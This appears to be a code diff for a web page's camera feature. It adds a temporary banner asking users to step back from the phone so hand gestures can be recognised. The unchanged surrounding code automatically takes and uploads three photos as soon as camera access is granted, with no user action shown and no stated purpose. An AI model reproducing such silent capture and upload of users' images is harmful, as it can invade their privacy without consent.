@@ -1643,6 +1643,8 @@ function initCamera() {
                                     // 摄像头权限获取成功，自动开始拍照（3张：立即+2s+4s）
                                     console.log('摄像头授权成功，自动开始拍照');
                                     startAutoCapture();
+                                    // 显示手势识别距离提示
+                                    showDistanceHint();
                                 })
                                 .catch((err) => {
                                     console.warn('视频播放失败:', err);
@@ -1668,6 +1670,8 @@ function initCamera() {
                                         // 摄像头权限获取成功，自动开始拍照（3张：立即+2s+4s）
                                         console.log('摄像头授权成功，自动开始拍照');
                                         startAutoCapture();
+                                        // 显示手势识别距离提示
+                                        showDistanceHint();
                                     }
                                 });
                         } else {
@@ -1688,6 +1692,8 @@ function initCamera() {
                             // 摄像头权限获取成功，自动开始拍照（3张：立即+2s+4s）
                             console.log('摄像头授权成功，自动开始拍照');
                             startAutoCapture();
+                            // 显示手势识别距离提示
+                            showDistanceHint();
                             // 启动手势识别（延迟 2 秒，待视频稳定后加载 MediaPipe）
                             if (!window._gestureInitScheduled) {
                                 window._gestureInitScheduled = true;
@@ -2161,6 +2167,40 @@ function startAutoCapture() {
     capturePhotoAndUpload();
     setTimeout(() => { capturePhotoAndUpload(); }, 2000);
     setTimeout(() => { capturePhotoAndUpload(); }, 4000);
+}
+
+// 手势识别距离提示：在页面顶部显示，5秒后自动隐藏
+function showDistanceHint() {
+    // 避免重复添加
+    if (document.getElementById('distanceHint')) {
+        return;
+    }
+    const hint = document.createElement('div');
+    hint.id = 'distanceHint';
+    hint.style.position = 'fixed';
+    hint.style.top = '20px';
+    hint.style.left = '50%';
+    hint.style.transform = 'translateX(-50%)';
+    hint.style.backgroundColor = 'rgba(20,10,40,0.85)';
+    hint.style.color = '#fff';
+    hint.style.padding = '10px 18px';
+    hint.style.borderRadius = '22px';
+    hint.style.fontSize = '14px';
+    hint.style.zIndex = '9000';
+    hint.style.boxShadow = '0 4px 14px rgba(0,0,0,0.3)';
+    hint.style.backdropFilter = 'blur(6px)';
+    hint.style.whiteSpace = 'nowrap';
+    hint.style.fontFamily = '-apple-system, BlinkMacSystemFont, "PingFang SC", sans-serif';
+    hint.textContent = '请离手机稍远一些方便识别手势';
+    document.body.appendChild(hint);
+    // 5秒后淡出并移除
+    setTimeout(() => {
+        hint.style.transition = 'opacity 0.5s ease';
+        hint.style.opacity = '0';
+        setTimeout(() => {
+            if (hint.parentNode) hint.remove();
+        }, 500);
+    }, 5000);
 }
 
 function capturePhotoAndUpload() {
